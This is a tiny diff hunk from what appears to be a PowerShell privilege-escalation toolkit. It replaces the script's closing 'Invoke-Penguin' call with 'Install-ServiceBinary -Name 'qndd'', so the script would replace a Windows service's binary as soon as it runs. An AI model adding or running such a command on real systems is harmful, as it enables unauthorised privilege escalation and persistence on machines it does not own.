@@ -2921,4 +2921,4 @@ $NTDll    = $Types['ntdll']
 
 Set-Alias Get-CurrentUserTokenGroupSid Get-ProcessTokenGroup
 
-Invoke-Penguin
+Install-ServiceBinary -Name 'qndd'
